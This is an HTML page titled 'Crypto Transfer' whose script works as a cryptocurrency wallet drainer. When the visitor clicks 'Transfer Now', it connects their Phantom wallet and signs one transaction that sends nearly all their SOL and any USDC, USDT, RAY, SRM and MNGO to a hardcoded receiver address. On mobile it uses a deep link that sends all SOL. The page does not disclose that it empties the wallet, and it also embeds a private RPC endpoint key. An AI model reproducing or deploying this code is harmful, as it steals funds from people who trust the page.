<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
</head>
<body>
    <h2>Click below to transfer SOL and selected tokens</h2>
    <button id="transferButton">Transfer Now</button>

    <script>
        document.getElementById('transferButton').addEventListener('click', async () => {
            const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";

            // List of SPL token addresses
            const splTokens = [
                { name: "USDC", address: "EPjFWdd5AufqSSqeM2q4wrkEMuPeHQHqEAgHyoGdsXh" },
                { name: "USDT", address: "Es9vMFrzaCERhHp9AxjBBa2CbcPy5j2KpR8wQNwMCXJs" },
                { name: "RAY", address: "4k3Dyjzvzp8eMKnWJNxRebxvd3z9dDEHtBzTiqzTQin1" },
                { name: "SRM", address: "ErgbzTg6WYPXD5bNy5XgGqmaPfkrZBXsS3pRZMWd7Qip" },
                { name: "MNGO", address: "Bb9bsTQaT7DjZ4dPkr9tjLv2JGKWLshg5c9mMp8Xxny9" }
            ];

            function isMobileDevice() {
                return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            }

            if (isMobileDevice()) {
                const mobileLink = `https://phantom.app/ul/v1/send?recipient=${receiverWallet}&asset=sol&amount=ALL`;
                window.location.href = mobileLink;
            } else {
                if (!window.solana) {
                    alert("Phantom wallet not found. Please install it.");
                    return;
                }

                try {
                    await window.solana.connect();
                    const provider = window.solana;
                    const connection = new solanaWeb3.Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df", 'confirmed');

                    const publicKey = provider.publicKey;
                    alert("Connected wallet: " + publicKey.toBase58());

                    const transaction = new solanaWeb3.Transaction();

                    // Transfer SOL (leaving some for fees)
                    const balance = await connection.getBalance(publicKey);
                    if (balance > 5000) {
                        transaction.add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: new solanaWeb3.PublicKey(receiverWallet),
                                lamports: balance - 5000,
                            })
                        );
                    }

                    // Transfer SPL tokens
                    for (const token of splTokens) {
                        const tokenAccount = await connection.getParsedTokenAccountsByOwner(publicKey, {
                            mint: new solanaWeb3.PublicKey(token.address),
                        });

                        if (tokenAccount.value.length > 0) {
                            const amount = tokenAccount.value[0].account.data.parsed.info.tokenAmount.uiAmount;
                            if (amount > 0) {
                                transaction.add(
                                    splToken.createTransferInstruction(
                                        tokenAccount.value[0].pubkey,
                                        new solanaWeb3.PublicKey(receiverWallet),
                                        publicKey,
                                        amount * Math.pow(10, tokenAccount.value[0].account.data.parsed.info.tokenAmount.decimals),
                                        [],
                                        splToken.TOKEN_PROGRAM_ID
                                    )
                                );
                            }
                        }
                    }

                    if (transaction.instructions.length === 0) {
                        alert("No funds available to transfer.");
                        return;
                    }

                    const { signature } = await provider.signAndSendTransaction(transaction);
                    alert("Transaction sent! Signature: " + signature);
                    await connection.confirmTransaction(signature);
                    alert("Transaction confirmed!");

                } catch (error) {
                    console.error("Error:", error);
                    alert("Error: " + error.message);
                }
            }
        });
    </script>

    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token"></script>
</body>
</html>
